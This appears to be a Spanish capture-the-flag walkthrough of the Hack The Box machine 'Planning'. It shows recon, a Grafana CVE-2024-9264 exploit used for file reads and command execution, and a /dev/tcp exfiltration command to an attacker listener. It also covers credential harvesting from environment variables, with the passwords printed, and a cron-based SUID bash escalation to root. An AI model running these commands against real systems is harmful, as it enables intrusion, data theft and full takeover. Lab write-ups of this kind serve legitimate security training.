```bash
echo "10.x.x.x planning.htb" | sudo tee -a /etc/hosts
```

# Port discovery.

```bash
sudo nmap -sCV -p22,80 --min-rate 2000 -Pn -n planning.htb
```


| Puerto | Estado | Servicio | Versión                                 | Información adicional                                                                 |
|--------|--------|----------|------------------------------------------|----------------------------------------------------------------------------------------|
| 22/tcp | Abierto| SSH      | OpenSSH 9.6p1 Ubuntu 3ubuntu13.11        | Host keys: ECDSA (62:ff:f6:d4:57:88:05:ad...), ED25519 (4c:ce:7d:5c:fb:2d:a0:9e...)    |
| 80/tcp | Abierto| HTTP     | nginx 1.24.0 (Ubuntu)                    | Título: "Edukate - Online Education Website", Header: nginx/1.24.0 (Ubuntu)           |


# Puerto 80


![[Pasted image 20250511140439.png]]

En la pagina nos encontramos diversos endpoints intersantes  por ejemplo `http://planning.htb/contact.php` con formularios basicos , tal vez un xss? una sqli?

![[Pasted image 20250511141230.png]]

Tras diversas pruebas no encuentro nada en la pagina que sea explotable. el fuzzing tampoco me encuentra ningun endpoint relevante
![[Pasted image 20250511141354.png]]

# Subdomain discovery
Usamos Ffuzz para encontrar subdominios 
http://ffuf.me/sub/vhost

```bash
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me
```

Una vez descubierto el numero de bytes por respuesta predeterminado filtramos esos con `fs`
```bash
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```

![[Pasted image 20250511140647.png]]



# Subdominio grafana.planning.htb

```bash
echo "10.x.x.x grafana.planning.htb" | sudo tee -a /etc/hosts
```

Descubrimos la version de grafana
![[Pasted image 20250511120324.png]]

https://github.com/nollium/CVE-2024-9264

Tenemos Arbitrary file read  !
```bash
(venv) ➜  CVE-2024-9264 git:(main) python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin

```

Tambien tenemos RCE!

```bash
(venv) ➜  CVE-2024-9264 git:(main) python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c whoami  http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root
```
Mandamos una revshell pero estamos en un docker
![[Pasted image 20250511121859.png]]

no podemos usar `ping` ni `ip` pero podemos usar `wget` y recibir respuesta de ips por lo que podemos confirmar que la 172.17.0.1 esta corriendo el servidor web principal
```bash
# ifconfig
/bin/sh: 31: ifconfig: not found
# ping 172.17.0.1
/bin/sh: 32: ping: not found
# wget  172.17.0.1:80/index.php
--2025-05-11 10:20:40--  http://172.17.0.1/index.php
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://planning.htb/index.php [following]
--2025-05-11 10:20:40--  http://planning.htb/index.php
Resolving planning.htb (planning.htb)... 
```

Encontramos un `.db`
```bash
# find / -type f -name "*db" 2>/dev/null
/var/lib/grafana/grafana.db
```

Me paso el archivo por `tcp`
![[Pasted image 20250511125532.png]]
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

Miramos la db pero no encontramos nada interesante ; parece el hash de la password del admin que ya tenemos.

```sql
sqlite> select * from user;
1|0|admin|admin@localhost||58e91b780977c1c34eb2274b75cb8577b215f2634a441fbb555d396edb3285a6c6b3a1f1ebca06e74ab6aa1a6a8edeb729d5|3H8kUvMcCR|cprH3V8GFe||1|1|0||2025-02-28 19:19:54|2025-04-03 12:31:49|0|2025-05-11 10:45:06|0|0|
sqlite> 
```
El archivo .db es un rabbithole


Se me da por revisar las variables de entorno con el comando `env` en en docker:

```bash
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7                                                                                    
AWS_AUTH_EXTERNAL_ID=                                                                                    
SHLVL=1                                                                                                  
HOME=/usr/share/grafana                                                                                  
OLDPWD=/usr/share/grafana                                                                                
AWS_AUTH_AssumeRoleEnabled=true                                                                          
GF_PATHS_LOGS=/var/log/grafana                                                                           
_=echo                                                                                                   
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana/public
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=env
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana/public

```
quien guarda las credenciales de esa forma??

Tenemos nuevas creds `enzo`:`RioTecRANDEntANT!`
```bash
ssh enzo@planning.htb
```
![[Pasted image 20250511130855.png]]

# Root

Revisamos conexiones

```bash
enzo@planning:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34799         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -           

```

Empezamos a hacer tuneles puerto por puerto de esta manera

```bash
ssh enzo@planning.htb -L 8000:localhost:8000 
```

Puerto `3000` puerto de grafana 
![[Pasted image 20250511134313.png]]

![[Pasted image 20250511134447.png]]

El puerto `8000` parece un servicio web interesante pero nos pide una contraseña 
![[Pasted image 20250511135108.png]]
![[Pasted image 20250511135117.png]]

Encontramos un archivo con credenciales `/opt/crontabs/crontab.db`
Este no es un archivo .db si no un json que le indica instrucciones a cron para un posible script o servicio personalizado.
![[Pasted image 20250511135233.png]]

Si probamos la password del archivo junto al usuario root nos encontramos ante una pagina crontab UI para crear cronjobs ; y parece que los creamos como root. Desde aqui es sencillo relativamente escalar; ademas observamos como el archivo anterior se esta parseando en la UI de modo que asumo que estaba ahi para ser parseado a la web
https://github.com/alseambusher/crontab-ui
![[Pasted image 20250511135353.png]]

Para escalar a root creamos un cronjob que nos copie el bash al tmp con el bit suid de root
```bash
* * * * * cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

![[Pasted image 20250511135716.png]]

![[Pasted image 20250511135829.png]]